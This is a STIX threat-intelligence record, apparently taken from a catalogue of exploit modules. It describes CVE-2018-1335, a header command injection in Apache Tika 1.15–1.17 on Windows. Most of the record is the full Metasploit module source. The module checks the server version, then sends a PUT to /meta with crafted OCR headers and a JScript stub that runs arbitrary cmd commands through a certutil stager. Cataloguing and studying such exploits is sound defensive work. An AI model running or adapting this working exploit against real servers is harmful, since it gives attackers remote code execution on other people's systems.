{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82caaa5c-eb14-4b7c-a14d-5e1e5b826f25",
    "created": "2024-08-14T16:52:34.363695Z",
    "modified": "2024-08-14T16:52:34.363701Z",
    "name": "Apache Tika Header Command Injection",
    "description": " This module exploits a command injection vulnerability in Apache Tika 1.15 - 1.17 on Windows.  A file with the image/jp2 content-type is used to bypass magic bytes checking.  When OCR is specified in the request, parameters can be passed to change the parameters passed at command line to allow for arbitrary JScript to execute. A JScript stub is passed to execute arbitrary code. This module was verified against version 1.15 - 1.17 on Windows 2012.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/apache_tika_jp2_jscript.rb",
            "external_id": "apache_tika_jp2_jscript.rb"
        },
        {
            "source_name": "reference",
            "url": "https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1335"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Tika Header Command Injection',\n      'Description'    => %q{\n          This module exploits a command injection vulnerability in Apache\n        Tika 1.15 - 1.17 on Windows.  A file with the image/jp2 content-type is\n        used to bypass magic bytes checking.  When OCR is specified in the\n        request, parameters can be passed to change the parameters passed\n        at command line to allow for arbitrary JScript to execute. A\n        JScript stub is passed to execute arbitrary code. This module was\n        verified against version 1.15 - 1.17 on Windows 2012.\n        While the CVE and finding show more versions vulnerable, during\n        testing it was determined only > 1.14 was exploitable due to\n        jp2 support being added.\n      },\n      'License'        => MSF_LICENSE,\n      'Privileged'     => false,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows',\n            {'Arch' => [ARCH_X86, ARCH_X64],\n            'Platform' => 'win',\n            'CmdStagerFlavor' => ['certutil']\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-04-25',\n      'Author' =>\n        [\n          'h00die', # msf module\n          'David Yesland', # edb submission\n          'Tim Allison' # discovery\n        ],\n      'References' =>\n        [\n          ['EDB', '46540'],\n          ['URL', 'https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/'],\n          ['URL', 'https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E'],\n          ['CVE', '2018-1335']\n        ]))\n\n    register_options(\n      [\n        Opt::RPORT(9998),\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/'])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n             'uri'    => normalize_uri(target_uri),\n           })\n    if res.nil?\n      vprint_error('No server response, check configuration')\n      return CheckCode::Safe\n    elsif res.code != 200\n      vprint_error('No server response, check configuration')\n      return CheckCode::Safe\n    end\n\n    if res.body =~ /Apache Tika (\\d.[\\d]+)/\n      version = Rex::Version.new($1)\n      vprint_status(\"Apache Tika Version Detected: #{version}\")\n      if version.between?(Rex::Version.new('1.15'), Rex::Version.new('1.17'))\n        return CheckCode::Vulnerable\n      end\n    end\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    cmd.gsub(/\"/, '\\\"')\n    jscript=\"var oShell = WScript.CreateObject('WScript.Shell');\\n\"\n    jscript << \"var oExec = oShell.Exec(\\\"cmd /c #{cmd}\\\");\"\n\n    print_status(\"Sending PUT request to #{peer}#{normalize_uri(target_uri, 'meta')}\")\n    res = send_request_cgi({\n             'method' => 'PUT',\n             'uri'    => normalize_uri(target_uri, 'meta'),\n             'headers' => {\n                \"X-Tika-OCRTesseractPath\" => '\"cscript\"',\n                \"X-Tika-OCRLanguage\"      => \"//E:Jscript\",\n                \"Expect\"                  => \"100-continue\",\n                \"Content-type\"            => \"image/jp2\",\n                \"Connection\"              => \"close\"},\n             'data' => jscript\n           })\n\n    fail_with(Failure::Disconnected, 'No server response') unless res\n    unless (res.code == 200 && res.body.include?('tika'))\n      fail_with(Failure::UnexpectedReply, 'Invalid response received, target may not be vulnerable')\n    end\n  end\n\n  def exploit\n    execute_cmdstager(linemax: 8000)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-04-25",
    "x_mitre_platforms": [
        "win'"
    ]
}